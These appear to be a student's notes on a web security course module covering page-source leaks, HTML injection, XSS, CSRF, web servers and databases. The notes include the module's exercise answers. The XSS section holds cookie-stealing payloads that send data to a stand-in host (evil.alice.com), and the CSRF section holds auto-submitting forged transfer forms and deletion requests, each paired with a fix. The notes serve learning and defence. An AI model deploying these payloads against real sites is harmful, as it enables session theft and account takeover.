all of the front end components covered above are interacted with on the client side. therefore, if they are attacked, they do not pose a direct threat to the core back end of the web application and usually will not lead to permanent damage. however, as these components are executed on the client side, they put the end user in danger of being attacked and exploited if they do have any vulnerabilities. if a front end vulnerability is leveraged to attack admin users, it could result in unauthorized access, access to sensitive data, service disruption, and more.

Q: who is at risk from front end vulns? A: the end user.

although the majority of web application penetration testing is focused on back end components and their functionality, it is important also to test front end components for potential vulnerabilities, as these types of vulnerabilities can sometimes be utilized to gain access to sensitive functionality (e.g. an admin panel), which may lead to compromising the entire server.

Q: why test the front end too? A: it can lead to an admin panel.

Sensitive Data Exposure refers to the availability of sensitive data in clear text to the end user. this is usually found in the `source code` of the web page, or page source, on the front end of web applications. this is the HTML source code of the application, not to be confused with the back end code that is typically only accessible on the server itself. i can view any website's page source in my browser by right clicking anywhere on the page and selecting `View Page Source` from the pop up menu. sometimes a developer may disable right clicking on a web application, but this does not prevent me from viewing the page source, as i can merely type `ctrl + u` or view the page source through a web proxy such as `Burp Suite`. let me take a look at the google.com page source. i right click and choose `View Page Source`, and a new tab opens in my browser with the URL `view-source:https://www.google.com/`. here i can see the `HTML`, `JavaScript`, and external links. i should take a moment to browse the page source a bit.

Q: shortcut to view page source? A: `ctrl + u`.

sometimes i may find login `credentials`, `hashes`, or other sensitive data hidden in the comments of a web page's source code, or within external `JavaScript` code being imported. other sensitive information may include exposed links or directories, or even exposed user information, all of which can potentially be leveraged to further my access within the web application, or even the web application's supporting infrastructure (webserver, database server, etc.).

for this reason, one of the first things i should do when assessing a web application is to review its page source code to see if i can identify any "low hanging fruit", such as exposed credentials or hidden links.

Q: what is the first thing to review? A: the page source.

#### Example

at first glance, the login form in the module does not look like anything out of the ordinary _(see screenshot, search anchor: "does not look like anything out")_. let me take a look at the page source:

```html
<form action="action_page.php" method="post">

    <div class="container">
        <label for="uname"><b>Username</b></label>
        <input type="text" required>

        <label for="psw"><b>Password</b></label>
        <input type="password" required>

        <!-- TODO: remove test credentials test:test -->

        <button type="submit">Login</button>
    </div>
</form>

</html>
```

i see that the developers added some comments that they forgot to remove, which contain test credentials:

```html
<!-- TODO: remove test credentials test:test -->
```

the comment seems to be a reminder for the developers to remove the test credentials. given that the comment has not been removed yet, these credentials may still be valid.

Q: are leftover test creds possibly valid? A: yes, if never removed.

although it is not very common to find login credentials in developer comments, i can still find various bits of sensitive and valuable information when looking at the source code, such as test pages or directories, debugging parameters, or hidden functionality. there are various automated tools that i can use to scan and analyze available page source code to identify potential paths or directories and other sensitive information.

leveraging these types of information can give me further access to the web application, which may help me attack the back end components to gain control over the server.

Q: what else hides in source besides creds? A: test pages, debug parameters.

#### Prevention

ideally, the front end source code should only contain the code necessary to run all of the web application's functions, without any extra code or comments that are not necessary for the web application to function properly. it is always important to review the code that will be visible to end users through the page source, or run it through tools to check for exposed information.

it is also important to classify data types within the source code and apply controls on what can or cannot be exposed on the client side. developers should also review client side code to ensure that no unnecessary comments or hidden links are left behind. furthermore, front end developers may want to use `JavaScript` code packing or obfuscation to reduce the chances of exposing sensitive data through `JavaScript code`. these techniques may prevent automated tools from locating these types of data.

Q: why obfuscate front end JS? A: to hide data from automated tools.

#### exercise questions

**question 1:** the module has question 1 for this section. the question text and the answer didn't make it into my copy of the page.

---

### 1.8 HTML Injection

another major aspect of front end security is validating and sanitizing accepted user input. in many cases, user input validation and sanitization is carried out on the back end. however, in some cases some user input would never make it to the back end and is completely processed and rendered on the front end. therefore, it is critical to validate and sanitize user input on both the front end and the back end.

Q: where must input be validated? A: both front end and back end.

HTML injection occurs when unfiltered user input is displayed on the page. this can either be through retrieving previously submitted code, like retrieving a user comment from the back end database, or by directly displaying unfiltered user input through `JavaScript` on the front end.

when a user has complete control of how their input will be displayed, they can submit `HTML` code, and the browser may display it as part of the page. this may include a malicious `HTML` code, like an external login form, which can be used to trick users into logging in while actually sending their login credentials to a malicious server to be collected for other attacks.

another example of `HTML Injection` is web page defacing. this consists of injecting new `HTML` code to change the web page's appearance, inserting malicious ads, or even completely changing the page. this type of attack can result in severe reputational damage to the company hosting the web application.

Q: what is injected HTML often used for? A: fake login forms, defacing.

#### Example

the following example is a very basic web page with a single button "**Click to enter your name**". when i click on the button, it prompts me to input my name and then displays my name as "**Your name is ...**" _(see screenshot, search anchor: "Click to enter your name")_.

if no input sanitization is in place, this is potentially an easy target for `HTML Injection` and `Cross Site Scripting (XSS)` attacks. i take a look at the page source code and see no input sanitization in place whatsoever, as the page takes user input and directly displays it:

```html
<!DOCTYPE html>
<html>

<body>
    <button onclick="inputFunction()">Click to enter your name</button>
    <p id="output"></p>

    <script>
        function inputFunction() {
            var input = prompt("Please enter your name", "");

            if (input != null) {
                document.getElementById("output").innerHTML = "Your name is " + input;
            }
        }
    </script>
</body>

</html>
```

Q: which line displays input unsanitized? A: the `innerHTML` assignment.

to test for `HTML Injection`, i can simply input a small snippet of `HTML` code as my name, and see if it is displayed as part of the page. i will test the following code, which changes the background image of the web page:

```html
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```

once i input it, i see that the web page's background image changes instantly.

in this example, as everything is being carried out on the front end, refreshing the web page would reset everything back to normal.

Q: does a refresh undo this injection? A: yes, it is front end only.

#### exercise questions

**question 1:** what text would be displayed on the page if we use the following payload as our input:

```html
<a href="http://www.hackthebox.com">Click Me</a>
```

answer recorded in the module: `Your name is click me`

---

### 1.9 Cross Site Scripting (XSS)

`HTML Injection` vulnerabilities can often be utilized to also perform Cross Site Scripting (XSS) attacks by injecting `JavaScript` code to be executed on the client side. once i can execute code on the victim's machine, i can potentially gain access to the victim's account or even their machine. `XSS` is very similar to `HTML Injection` in practice. however, `XSS` involves the injection of `JavaScript` code to perform more advanced attacks on the client side, instead of merely injecting HTML code. there are three main types of `XSS`:

|Type|Description|
|---|---|
|Reflected XSS|occurs when user input is displayed on the page after processing (e.g. search result or error message)|
|Stored XSS|occurs when user input is stored in the back end database and then displayed upon retrieval (e.g. posts or comments)|
|DOM XSS|occurs when user input is directly shown in the browser and is written to an `HTML` DOM object (e.g. vulnerable username or page title)|

Q: which XSS type persists in the database? A: Stored XSS.

in the example from `HTML Injection`, there was no input sanitization whatsoever. therefore, it may be possible for the same page to be vulnerable to `XSS` attacks. i can try to inject the following `DOM XSS` `JavaScript` code as a payload, which should show me the cookie value for the current user:

```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

once i input my payload and hit `ok`, i see that an alert window pops up with the cookie value in it _(see screenshot, search anchor: "alert window pops up")_.

this payload is accessing the `HTML` document tree and retrieving the `cookie` object's value. when the browser processes my input, it will be considered a new `DOM`, and my `JavaScript` will be executed, displaying the cookie value back to me in a popup.

Q: what does `document.cookie` return? A: the current user's cookie value.

an attacker can leverage this to steal cookie sessions and send them to themselves, and attempt to use the cookie value to authenticate to the victim's account. the same attack can be used to perform various types of other attacks against a web application's users. `XSS` is a vast topic that will be covered in depth in later modules.

Q: what can a stolen session cookie give an attacker? A: the victim's account.

#### exercise questions

**question 1:** try to use XSS to get the cookie value in the above page

answer recorded in the module: `XSSisFun`

#### my personal actions

1. go to the website, press `ctrl + u`
2. notice that javascript just writes with inner html into the html part of the website
3. write payload

```html
<img src="x" onerror="alert(document.cookie)">
```

basically, there's a fallback function that is to be written with onerror attribute. since x doesnt exist, it automatically executes the payload and steals the cookie.

##### xss notes (just took it on my part for interest)

**1. reflected xss, flask**

```python
# app.py, vulnerable flask route
from flask import Flask, request

app = Flask(__name__)

@app.route('/search')
def search():
    q = request.args.get('q', '')
    return f"""
    <html><body>
      <h2>you searched for: {q}</h2>
    </body></html>
    """
```

**alice's move:** she crafts this url and sends it to the victim (email, discord, whatever):

```
http://localhost:5000/search?q=<script>fetch('https://evil.alice.com/steal?c='+document.cookie)</script>
```

**what actually happens under the hood, step by step:**

|step|who|what happens|
|---|---|---|
|1|victim|clicks alice's link, browser sends `GET /search?q=<script>...`|
|2|flask|`request.args.get('q')` pulls the raw string out of the query string, python f string glues it directly into the html with zero encoding|
|3|server response|the raw bytes sent back literally contain `<h2>you searched for: <script>fetch(...)</script></h2>`|
|4|browser's html parser|reads the response top to bottom, hits `<script>`, recognizes it as a real script tag (because syntactically it is one), hands the contents to the js engine|
|5|js engine (v8/spidermonkey)|executes `fetch('https://evil.alice.com/steal?c='+document.cookie)` as if alice wrote it herself in a `<script>` tag on the page|
|6|network|victim's browser, using victim's own cookie, sends a request to alice's server. alice now has the session cookie|

the critical thing: the browser's html parser has no concept of "this text came from a url parameter, treat it as suspicious." it just sees bytes that look like a `<script>` tag and tokenizes them as one. there's no separate "data channel," everything is one html stream.

**fix:**

```python
from markupsafe import escape

@app.route('/search')
def search():
    q = request.args.get('q', '')
    return f"<h2>you searched for: {escape(q)}</h2>"
```

`escape()` turns `<` into `&lt;`, `>` into `&gt;`, etc. now the bytes sent are `&lt;script&gt;...`, and the html parser's tokenizer reads that as literal text content, not a tag start. it never becomes a node in the dom tree, so the js engine never sees it. (if you use `render_template` with jinja2 instead of raw f strings, this is on by default, jinja2 autoescapes.)

---

**2. stored xss, flask**

```python
# app.py, vulnerable flask route, in memory "db" for simplicity
from flask import Flask, request

app = Flask(__name__)
reviews = []

@app.route('/review', methods=['POST'])
def post_review():
    text = request.form.get('text', '')
    reviews.append(text)  # saved raw, no sanitization
    return "posted"

@app.route('/product')
def product():
    html = "<html><body><h1>product reviews</h1>"
    for r in reviews:
        html += f"<div class='review'>{r}</div>"  # rendered raw
    html += "</body></html>"
    return html
```

**alice's move:** she submits a review through the normal form (or curl, doesn't matter):

```bash
curl -X POST http://localhost:5000/review \
  -d "text=<img src=x onerror=\"fetch('https://evil.alice.com/steal?c='+document.cookie)\">"
```

note: `<script>` tags inserted via innerHTML style string concatenation into a response actually do get parsed and run here too since this is a fresh server rendered page load (not a js `innerHTML` injection, more on that distinction in part 3). but alice uses `<img onerror=...>` here deliberately because it's the classic payload that works in more contexts, including ones where raw `<script>` tags get stripped by weak filters but event handler attributes don't.

**what happens under the hood:**

|step|who|what happens|
|---|---|---|
|1|alice|posts payload, flask appends the raw string to the `reviews` list, no validation, no encoding|
|2|any victim|just browses to `/product` normally, no malicious link needed|
|3|flask|loops over `reviews`, string concatenates each one straight into the html response|
|4|server response|contains `<div class='review'><img src=x onerror="fetch(...)"></div>`|
|5|browser html parser|parses `<img src=x>`. src="x" is not a valid image url, so the image fails to load|
|6|browser|image load failure fires the `onerror` event, which was literally the attacker's js string, treated as an event handler|
|7|js engine|runs `fetch('https://evil.alice.com/steal?c='+document.cookie)`, victim's cookie goes to alice|

the key difference from reflected: this isn't a one time round trip tied to a clicked link. the payload lives in `reviews`, so every future request to `/product`, from any visitor, re triggers steps 3 through 7. alice injects once, harvests forever (until someone cleans the db).

**fix:**

```python
from markupsafe import escape

@app.route('/product')
def product():
    html = "<html><body><h1>product reviews</h1>"
    for r in reviews:
        html += f"<div class='review'>{escape(r)}</div>"
    html += "</body></html>"
    return html
```

same principle as reflected: encode on the way out, at render time, not just on the way in. if you want to allow safe subset of html (bold, links), don't try to write your own regex filter, use a real allowlist sanitizer (bleach in python) server side, and consider dompurify client side as a second layer. also set a csp header as defense in depth:

```python
@app.after_request
def add_csp(response):
    response.headers['Content-Security-Policy'] = "script-src 'self'"
    return response
```

this means even if some payload slips through the sanitizer, inline event handlers like `onerror="..."` just won't execute, because csp blocks inline scripts by default.

---

**3. dom based xss, flask**

this is the interesting one: the flask server side code is completely clean. the bug is 100% in alice's target js, which runs client side.

```python
# app.py, server side is totally clean, serves static html + js
from flask import Flask

app = Flask(__name__)

@app.route('/profile')
def profile():
    return """
    <html><body>
      <div id="welcome"></div>
      <script src="/static/profile.js"></script>
    </body></html>
    """
```

```js
// static/profile.js, this is the vulnerable client side code
const params = new URLSearchParams(window.location.search);
const name = params.get('name');
document.getElementById('welcome').innerHTML = "hello, " + name;
```

**alice's move:** crafts this url:

```
http://localhost:5000/profile?name=<img src=x onerror=alert(document.cookie)>
```

**what happens under the hood:**

|step|who|what happens|
|---|---|---|
|1|victim|clicks the link, browser requests `GET /profile?name=<img...>`|
|2|flask|responds with the completely static, clean html above. the payload in the url is never touched server side at all, flask doesn't even read query params in this route|
|3|browser|parses the clean html, loads `profile.js`, starts executing it|
|4|profile.js|reads `window.location.search` directly in the browser, which still contains alice's raw payload string (the browser doesn't sanitize urls for you)|
|5|`.innerHTML =` assignment|this is the critical line. assigning to `innerHTML` doesn't just set text, it tells the browser "reparse this string as html and build dom nodes from it"|
|6|browser's html parser (invoked by the dom api this time, not the initial page load)|parses `<img src=x onerror=alert(document.cookie)>`, creates a real `<img>` element, img fails to load (src="x" is invalid)|
|7|onerror fires|js engine runs `alert(document.cookie)` (alice would really use fetch to exfil, alert is just the textbook poc)|

the reason this is called dom based: notice step 2, the server response was 100% clean, it never contained the payload. if you view source on the delivered page, you'd see nothing suspicious. the vulnerability is entirely inside step 5, the browser's own `innerHTML` setter acts as a second html parser invocation, completely independent of the network response. this is why server side logging/wafs that only inspect http traffic can totally miss dom xss, there's no "malicious response" to flag, the malicious parsing happens purely client side, after the fact, driven by legitimate looking js that mishandles `location.search`.

**fix:**

```js
// static/profile.js, fixed
const params = new URLSearchParams(window.location.search);
const name = params.get('name');
document.getElementById('welcome').textContent = "hello, " + name;
```

`textContent` sets the node's text value directly, it never invokes the html parser at all. the string `<img src=x onerror=...>` just gets displayed literally as text on the page, dead on arrival, no dom nodes get created from it. if you actually need to render some html (not just text), sanitize first:

```js
import DOMPurify from 'dompurify';
document.getElementById('welcome').innerHTML = DOMPurify.sanitize("hello, " + name);
```

---

**cybersec angle, side by side comparison of where the trust boundary breaks:**

|type|boundary that got crossed|detection difficulty for a blue teamer|
|---|---|---|
|reflected|server trusts `request.args` is safe to echo|easy, grep access logs for `<script` in query strings|
|stored|server trusts its own db is safe to render|medium, need to audit stored content, not just live traffic|
|dom based|client js trusts `location`/`document.referrer`/etc is safe to parse as html|hard, nothing shows up server side at all, needs client side code review or a tool like a browser based dast scanner|

---

### 1.10 Cross Site Request Forgery (CSRF)

the third type of front end vulnerability that is caused by unfiltered user input is Cross Site Request Forgery (CSRF). `CSRF` attacks may utilize `XSS` vulnerabilities to perform certain queries, and `API` calls on a web application that the victim is currently authenticated to. this would allow the attacker to perform actions as the authenticated user. it may also utilize other vulnerabilities to perform the same functions, like utilizing HTTP parameters for attacks.

Q: whose session does CSRF abuse? A: the authenticated victim's.

a common `CSRF` attack to gain higher privileged access to a web application is to craft a `JavaScript` payload that automatically changes the victim's password to the value set by the attacker. once the victim views the payload on the vulnerable page (e.g. a malicious comment containing the `JavaScript` `CSRF` payload), the `JavaScript` code would execute automatically. it would use the victim's logged in session to change their password. once that is done, the attacker can log in to the victim's account and control it.

Q: what does the password change payload ride on? A: the victim's logged in session.

`CSRF` can also be leveraged to attack admins and gain access to their accounts. admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back end server (depending on the functionality provided to admins within a given web application). following this example, instead of using `JavaScript` code that would return the session cookie, i would load a remote `.js` (`JavaScript`) file, as follows:

```html
"><script src=//www.example.com/exploit.js></script>
```

the `exploit.js` file would contain the malicious `JavaScript` code that changes the user's password. developing the `exploit.js` in this case requires knowledge of this web application's password changing procedure and `APIs`. the attacker would need to create `JavaScript` code that would replicate the desired functionality and automatically carry it out (i.e. `JavaScript` code that changes my password for this specific web application).

Q: why target admins with CSRF? A: their functions can reach the server.

#### Prevention

though there should be measures on the back end to detect and filter user input, it is also always important to filter and sanitize user input on the front end before it reaches the back end, and especially if this code may be displayed directly on the client side without communicating with the back end. two main controls must be applied when accepting user input:

|Type|Description|
|---|---|
|Sanitization|removing special characters and non standard characters from user input before displaying it or storing it|
|Validation|ensuring that submitted user input matches the expected format (i.e. submitted email matched email format)|

Q: which control checks the expected format? A: Validation.

furthermore, it is also important to sanitize displayed output and clear any special/non standard characters. in case an attacker manages to bypass front end and back end sanitization and validation filters, it will still not cause any harm on the front end.

once i sanitize and/or validate user input and displayed output, i should be able to prevent attacks like `HTML Injection` and `XSS`. another solution would be to implement a web application firewall (WAF), which can help prevent injection attempts automatically. however, it should be noted that WAF solutions can potentially be bypassed, so developers should follow coding best practices and not merely rely on an appliance to detect/block attacks.

Q: can a WAF be relied on alone? A: no, it can be bypassed.

to defend against `XSS`, modern browsers have built in protections that block the automatic execution of Javascript code. in the case of `CSRF`, most modern web applications include anti CSRF mechanisms, such as requiring a unique token for each session or request. additionally, HTTP level defenses like the `SameSite` cookie attribute (`SameSite=Strict` or `Lax`) can restrict browsers from including authentication cookies in cross origin requests. functional protections, like requiring the user to input their password before changing it, can also help mitigate the impact of CSRF. despite these security measures, they can still be bypassed in certain scenarios. as a result, vulnerabilities like XSS and CSRF continue to pose significant risks to web application users. these defenses should be treated as additional layers of protection, not primary safeguards: developers must ensure that their applications are secure by design and not inherently vulnerable to such attacks.

Q: which cookie attribute limits cross origin cookies? A: `SameSite`.

the module links the OWASP Cross Site Request Forgery Prevention Cheat Sheet, which discusses the attack and prevention measures in greater detail.

#### my personal actions

##### csrf notes (additional, again)

###### the root cause

browsers attach cookies to a request based purely on the **destination domain**, never on which page initiated the request. a session cookie for `jayce-bank.com` gets attached whether jayce clicked something on `jayce-bank.com` or an invisible form on `alice-evil.com` fired at it.

_Q: does the browser care which page triggered the request before attaching the cookie? A: no, only the destination domain matters._

###### why same origin policy (sop) doesn't save you

sop has exactly two jobs: block cross origin **reads** of responses, and... that's it. it never blocked cross origin **sends**. csrf lives entirely in that gap: the forged request still physically fires, cookie attached, sop just stops alice from reading what comes back.

_Q: does sop stop a forged request from being sent? A: no, it only blocks reading the response._

###### attack trace 1: the post based money transfer (alice → jayce)

jayce's bank route, vulnerable version:

```python
@app.route("/transfer", methods=["POST"])
def transfer():
    if "user_id" not in session:
        return "unauthorized", 401
    to_account = request.form["to"]
    amount = request.form["amount"]
    # ...move the money...
```

this checks **authentication** (is some valid session present) but never **provenance** (did this request actually come from jayce's intent).

step by step:

1. jayce logs into `bank.com` in tab A. browser now holds jayce's signed session cookie.
2. alice emails jayce a link to `evil.com` (tab B).
3. `evil.com`'s html contains an auto submitting form:

```html
<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="9999">
</form>
<script>document.getElementById("f").submit();</script>
```

4. the instant jayce's browser renders this page, the js fires the form's POST.
5. browser sees "request going to `bank.com`" and auto attaches jayce's session cookie, same rule as the root cause above. no password, no cookie theft needed.
6. `bank.com` server sees: valid session cookie + POST to `/transfer` → executes the transfer. jayce never clicked anything beyond opening the page.

_Q: does alice ever need jayce's password in this attack? A: no, she rides the existing session cookie._

###### attack trace 2: the get based delete account (alice → jayce)

if jayce's app is sloppy enough to put a state change on **GET** (`kind.com/delete-account?confirm=yes`), it's strictly easier:

```html
<img src="https://kind.com/delete-account?confirm=yes">
```

step by step:

1. jayce is logged into `kind.com`.
2. jayce visits `evil.com`, which contains just that one `<img>` tag, nothing else.
3. browser parses the tag, tries to fetch the `src` url to render it as an image, no click, no js needed.
4. that fetch is a GET to `kind.com`, so the session cookie auto attaches.
5. `kind.com` sees a valid session + GET to the delete route, and (since the route is poorly designed) executes the delete right there.
6. jayce sees a broken image icon. account is already gone.

this is why state changes should never live behind GET: `<img>`, `<script src>`, `<link href>`, `<iframe src>` all fire GETs passively, just from being on a page.

_Q: does attack trace 2 need any js at all? A: no, the img tag alone triggers it._

###### the fix: csrf tokens

```python
from flask_wtf import CSRFProtect
csrf = CSRFProtect(app)
```

```html
<input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
```

`CSRFProtect` adds a second check before the view runs: not just "is there a valid session," but "did this request carry the correct per session token." alice can forge the request (cookie auto attaches) but she can't forge the token, because sop blocks her from **reading** jayce's rendered page to steal that value in the first place. this is the one place sop actually helps.

_Q: why can't alice just copy the token into her forged form? A: sop stops her js from reading bank.com's page content._

###### secondary defenses

- **SameSite=Lax/Strict cookie flag**: tells the browser not to attach the cookie at all on most cross site requests. forged request arrives with no session cookie, server sees it as unauthenticated. fixes csrf at the cookie layer instead of the token validation layer.
- **requiring a custom header** (e.g. `X-Requested-With`): browsers can't attach arbitrary custom headers on a plain cross site form/img request without triggering a CORS preflight, which a bare forged request can't satisfy. cheap secondary gate.
- in practice: stack SameSite + tokens, belt and suspenders.

_Q: does SameSite alone replace csrf tokens as the only defense needed? A: no, it's one layer, tokens are the more robust layer._

###### xss vs csrf (the correction that came up mid session)

easy to conflate these, they're not the same bug:

- **xss**: attacker's code executes **inside** the trusted site (via unsanitized input), so it has full access: cookies, dom, everything.
- **csrf**: attacker's code runs entirely **outside** the trusted site, on their own page, and just tricks the victim's browser into firing a request **at** the trusted site.

_Q: does csrf require injecting code into jayce's bank site? A: no, the attacker's code never touches the trusted site._

###### structured breakdown (cheat sheet)

|Phenomenon / Concept|Explanation / Formula|Practical Usage / Problem Solved|
|:--|:--|:--|
|cookie auto attach|browser attaches cookies by destination domain, not by initiating page|root cause of csrf, explains why "no login needed"|
|sop's real scope|blocks cross origin reads, never blocked cross origin sends|explains why csrf isn't blocked by default browser security|
|vulnerable flask route|checks `"user_id" in session` only|shows auth check ≠ provenance check|
|forged POST exploit|auto submitting `<form>` + js `.submit()`|only way to fire a POST passively, since `<a>`/`<img>` can't|
|forged GET exploit|`<img src="...">`|fires automatically on page load, no js, no click|
|`CSRFProtect(app)`|validates a per session token on every POST/PUT/DELETE|fixes provenance gap, token unreadable cross origin thanks to sop|
|`SameSite=Lax`|withholds cookie on cross site requests|kills csrf at the cookie layer, independent of tokens|
|custom header check|cross site requests can't set arbitrary headers without CORS preflight|cheap secondary csrf gate for apis|
|xss vs csrf|xss = code runs inside trusted site; csrf = code runs outside, just sends a request|prevents conflating two different vuln classes|

---

### 1.11 Back End Servers

a back end server is the hardware and operating system on the back end that hosts all of the applications necessary to run the web application. it is the real system running all of the processes and carrying out all of the tasks that make up the entire web application. the back end server would fit in the Data access layer.

Q: which layer does the back end server fit? A: the Data access layer.

#### Software

the back end server contains the other 3 back end components:

- Web Server
- Database
- Development Framework

other software components on the back end server may include hypervisors, containers, and WAFs.

there are many popular combinations of "stacks" for back end servers, which contain a specific set of back end components. some common examples include:

|Combinations|Components|
|---|---|
|LAMP|`Linux`, `Apache`, `MySQL`, and `PHP`|
|WAMP|`Windows`, `Apache`, `MySQL`, and `PHP`|
|WINS|`Windows`, `IIS`, `.NET`, and `SQL Server`|
|MAMP|`macOS`, `Apache`, `MySQL`, and `PHP`|
|XAMPP|`Cross Platform`, `Apache`, `MySQL`, and `PHP/PERL`|

the module links a comprehensive list of Web Solution Stacks in an article.

Q: what does the M in LAMP stand for? A: MySQL.

#### Hardware

the back end server contains all of the necessary hardware. the power and performance capabilities of this hardware determine how stable and responsive the web application will be. as previously discussed in the Architecture section, many architectures, especially for huge web applications, are designed to distribute their load over many back end servers that collectively work together to perform the same tasks and deliver the web application to the end user. web applications do not have to run directly on a single back end server, but may utilize data centers and cloud hosting services that provide virtual hosts for the web application.

Q: what decides how stable the web app is? A: the hardware's power and performance.

#### exercise questions

**question 1:** what operating system is 'WAMP' used with?

answer recorded in the module: `Windows`

---

### 1.12 Web Servers

a web server is an application that runs on the back end server, which handles all of the HTTP traffic from the client side browser, routes it to the requested pages, and finally responds to the client side browser. web servers usually run on TCP ports `80` or `443`, and are responsible for connecting end users to various parts of the web application, in addition to handling their various responses.

Q: which ports do web servers usually use? A: `80` and `443`.

#### Workflow

a typical web server accepts HTTP requests from the client side, and responds with different HTTP responses and codes, like a `200 OK` code response for a successful request, a `404 NOT FOUND` code when requesting pages that do not exist, `403 FORBIDDEN` code for requesting access to restricted pages, and so on.

the following are some of the most common HTTP response codes:

|Code|Description|
|---|---|
|**Successful responses**||
|`200 OK`|the request has succeeded|
|**Redirection messages**||
|`301 Moved Permanently`|the URL of the requested resource has been changed permanently|
|`302 Found`|the URL of the requested resource has been changed temporarily|
|**Client error responses**||
|`400 Bad Request`|the server could not understand the request due to invalid syntax|
|`401 Unauthorized`|unauthenticated attempt to access page|
|`403 Forbidden`|the client does not have access rights to the content|
|`404 Not Found`|the server can not find the requested resource|
|`405 Method Not Allowed`|the request method is known by the server but has been disabled and cannot be used|
|`408 Request Timeout`|this response is sent on an idle connection by some servers, even without any previous request by the client|
|**Server error responses**||
|`500 Internal Server Error`|the server has encountered a situation it doesn't know how to handle|
|`502 Bad Gateway`|the server, while working as a gateway to get a response needed to handle the request, received an invalid response|
|`504 Gateway Timeout`|the server is acting as a gateway and cannot get a response in time|

Q: which code means page not found? A: `404`.

web servers also accept various types of user input within HTTP requests, including text, JSON, and even binary data (e.g. for file uploads). once a web server receives a web request, it is then responsible for routing it to its destination, run any processes needed for that request, and return the response to the user on the client side. the pages and files that the webserver processes and routes traffic to are the web application core files.

Q: what does the web server do after routing? A: runs processes, returns the response.

the following shows an example of requesting a page in a Linux terminal using the cURL utility, and receiving the server response while using the `-I` flag, which displays the headers:

```shellsession
cybermaxxer@htb[/htb]$ curl -I https://academy.hackthebox.com

HTTP/2 200
date: Tue, 15 Dec 2020 19:54:29 GMT
content-type: text/html; charset=UTF-8
...SNIP...
```

while this command example shows the source code of the webpage with `cURL`:

```shellsession
cybermaxxer@htb[/htb]$ curl https://academy.hackthebox.com

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>Cyber Security Training : HTB Academy</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
```

> note: the `cybermaxxer@htb[/htb]$` prompt is the module's own example text, not a command i ran myself.

Q: which cURL flag shows only headers? A: `-I`.

many web server types can be utilized to run web applications. most of these can handle all types of complex HTTP requests, and they are usually free of charge. i can even develop my own basic web server using languages such as `Python`, `JavaScript`, and `PHP`. however, for each language, there's a popular web application that is optimized for handling large amounts of web traffic, which saves time in creating my own web server.

#### Apache

`Apache` (or `httpd`) is the most common web server on the internet, hosting more than `40%` of all internet websites. `Apache` usually comes preinstalled in most `Linux` distributions and can also be installed on Windows and macOS servers.

`Apache` is usually used with `PHP` for web application development, but it also supports other languages like `.Net`, `Python`, `Perl`, and even OS languages like `Bash` through `CGI`. users can install a wide variety of `Apache` modules to extend its functionality and support more languages. for example, to support serving `PHP` files, users must install `PHP` on the back end server, in addition to installing the `mod_php` module for `Apache`.

`Apache` is an open source project, and community users can access its source code to fix issues and look for vulnerabilities. it is well maintained and regularly patched against vulnerabilities to keep it safe against exploitation. furthermore, it is very well documented, making using and configuring different parts of the webserver relatively easy. `Apache` is commonly used by startups and smaller companies, as it is straightforward to develop for. still, some big companies utilize Apache, including:

|Apple|Adobe|Baidu|
|---|---|---|

Q: which module serves PHP on Apache? A: `mod_php`.

#### NGINX

`NGINX` is the second most common web server on the internet, hosting roughly `30%` of all internet websites. `NGINX` focuses on serving many concurrent web requests with relatively low memory and CPU load by utilizing an async architecture to do so. this makes `NGINX` a very reliable web server for popular web applications and top businesses worldwide, which is why it is the most popular web server among high traffic websites, with around 60% of the top 100,000 websites using `NGINX`.

`NGINX` is also free and open source, which gives all the same benefits previously mentioned, like security and reliability. some popular websites that utilize `NGINX` include:

|Google|Facebook|Twitter|Cisco|Intel|Netflix|Hack The Box|
|---|---|---|---|---|---|---|

Q: why do high traffic sites pick NGINX? A: async architecture, low load.

#### IIS

`IIS` (Internet Information Services) is the third most common web server on the internet, hosting around `15%` of all internet web sites. `IIS` is developed and maintained by Microsoft and mainly runs on Microsoft Windows Servers. `IIS` is usually used to host web applications developed for the Microsoft `.NET` framework, but can also be used to host web applications developed in other languages like `PHP`, or host other types of services like `FTP`. furthermore, `IIS` is very well optimized for Active Directory integration and includes features like `Windows Auth` for authenticating users using Active Directory, allowing them to automatically sign in to web applications.

though not the most popular web server, many big organizations use `IIS` as their web server. many of them use Windows Server on their back end or rely heavily on Active Directory within their organization. some popular websites that utilize `IIS` include:

|Microsoft|Office365|Skype|Stack Overflow|Dell|
|---|---|---|---|---|

aside from these 3 web servers, there are many other commonly used web servers, like Apache Tomcat for `Java` web applications, and Node.JS for web applications developed using `JavaScript` on the back end.

Q: which web server pairs with Active Directory? A: `IIS`.

#### exercise questions

**question 1:** if a web server returns an HTTP code 201, what does it stand for?

answer recorded in the module: `Created`

---

### 1.13 Databases

web applications utilize back end databases to store various content and information related to the web application. this can be core web application assets like images and files, web application content like posts and updates, or user data like usernames and passwords. this allows web applications to easily and quickly store and retrieve data and enable dynamic content that is different for each user.

there are many different types of databases, each of which fits a certain type of use. most developers look for certain characteristics in a database, such as `speed` in storing and retrieving data, `size` when storing large amounts of data, `scalability` as the web application grows, and `cost`.

Q: name two traits developers want in a DB. A: speed and scalability.

#### Relational (SQL)

relational (SQL) databases store their data in tables, rows, and columns. each table can have unique keys, which can link tables together and create relationships between tables.

for example, a relational database can have a `users` table containing columns like `id`, `username`, `first_name`, `last_name`, and so on. the `id` can be used as the table key. another table, `posts`, may contain posts made by all users, with columns like `id`, `user_id`, `date`, `content`, and so on.

i can link the `id` from the `users` table to the `user_id` in the `posts` table to easily retrieve the user details for each post, without having to store all user details with each post.

a table can have more than one key, as another column can be used as a key to link with another table. for example, the `id` column can be used as a key to link the `posts` table to another table containing comments, each of which belongs to a certain post, and so on.

the relationship between tables within a database is called a Schema.

this way, by using relational databases, it becomes very quick and easy to retrieve all data about a certain element from all databases. for example, i can retrieve all details linked to a certain user from all tables with a single query. this makes relational databases very fast and reliable for big datasets that have a clear structure and design. databases also make data management very efficient.

Q: what is the relationship between tables called? A: a Schema.

some of the most common relational databases include:

|Type|Description|
|---|---|
|`MySQL`|the most commonly used database around the internet. it is an open source database and can be used completely free of charge|
|`MSSQL`|Microsoft's implementation of a relational database. widely used with Windows Servers and IIS web servers|
